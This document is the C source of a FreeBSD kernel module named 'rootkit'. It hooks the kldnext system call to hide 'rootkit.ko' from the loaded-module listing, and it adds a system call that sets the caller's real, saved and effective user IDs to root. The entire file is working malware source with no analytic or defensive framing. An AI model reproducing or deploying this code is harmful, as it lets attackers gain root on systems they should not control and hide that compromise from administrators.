#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/param.h>
#include <sys/linker.h>

#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/mutex.h>
#include <sys/lock.h>
#include <sys/sx.h>

extern struct sx kld_sx;
extern linker_file_list_t linker_files;

static linker_file_t linker_find_file_by_id(int _fileid);
static linker_file_t linker_find_file_by_id(int fileid) {
	linker_file_t lf;

	sx_assert(&kld_sx, SA_XLOCKED);
	TAILQ_FOREACH(lf, &linker_files, link)
		if (lf->id == fileid && lf->flags & LINKER_FILE_LINKED)
			break;
	return (lf);
}

int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap);
void elevate(struct thread *td);

int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap)
{
	linker_file_t lf;
	int error = 0;

#ifdef MAC
	error = mac_kld_check_stat(td->td_ucred);
	if (error)
		return (error);
#endif

	sx_xlock(&kld_sx);
	if (uap->fileid == 0)
		lf = TAILQ_FIRST(&linker_files);
	else {
		lf = linker_find_file_by_id(uap->fileid);
		if (lf == NULL) {
			error = ENOENT;
			goto out;
		}
		lf = TAILQ_NEXT(lf, link);
	}

	/* Skip partially loaded files. */
	while (lf != NULL && !(lf->flags & LINKER_FILE_LINKED))
		lf = TAILQ_NEXT(lf, link);

	if(strcmp(lf->filename, "rootkit.ko") == 0) {
		lf = TAILQ_NEXT(lf, link);
	}

	if (lf)
		td->td_retval[0] = lf->id;
	else
		td->td_retval[0] = 0;
out:
	sx_xunlock(&kld_sx);
	return (error);
}

/* The system call's arguments. */
struct rootkit_args {
};

void elevate(struct thread *td) {
	struct proc *p = td->td_proc;
	struct ucred *newcred, *oldcred;
	uid_t uid;
	struct uidinfo *uip;

	uid = 0;
	newcred = crget();
	uip = uifind(uid);
	PROC_LOCK(p);
	/*
	 * Copy credentials so other references do not see our changes.
	 */
	oldcred = crcopysafe(p, newcred);

	/*
	* Set the real uid and transfer proc count to new user.
	*/
	change_ruid(newcred, uip);
	/*
	* Set saved uid
	*
	* XXX always set saved uid even if not _POSIX_SAVED_IDS, as
	* the security of seteuid() depends on it.  B.4.2.2 says it
	* is important that we should do this.
	*/
	change_svuid(newcred, uid);

	/*
	 * In all permitted cases, we are changing the euid.
	 */
	change_euid(newcred, uip);
	setsugid(p);
	proc_set_cred(p, newcred);

	PROC_UNLOCK(p);

	uifree(uip);
	crfree(oldcred);
}

/* The system call function. */
static int rootkit_func(struct thread *td, void *syscall_args) {
	struct rootkit_args *uap;
	uap = (struct rootkit_args *)syscall_args;

	elevate(td);

	return(0);
}

/* The sysent for the new system call. */
static struct sysent rootkit_sysent = {
	0,			/* number of arguments */
	rootkit_func		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		uprintf("System call loaded at offset %d.\n", offset);
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
		// uprintf("kldnext hooked - pointed to %p ytb\n", (void *)sysent[SYS_kldnext].sy_call);
		break;

	case MOD_UNLOAD:
		uprintf("System call unloaded from offset %d.\n", offset);
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
		// uprintf("next unhooked - returned to original syscall at %p\n", (void *)sysent[SYS_kldnext].sy_call);
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

static struct syscall_module_data rootkit_func_mod = {
	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
};

static moduledata_t rootkit_mod = {
	"rootkit",
	syscall_module_handler,
	&rootkit_func_mod
};

DECLARE_MODULE(rootkit_func, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
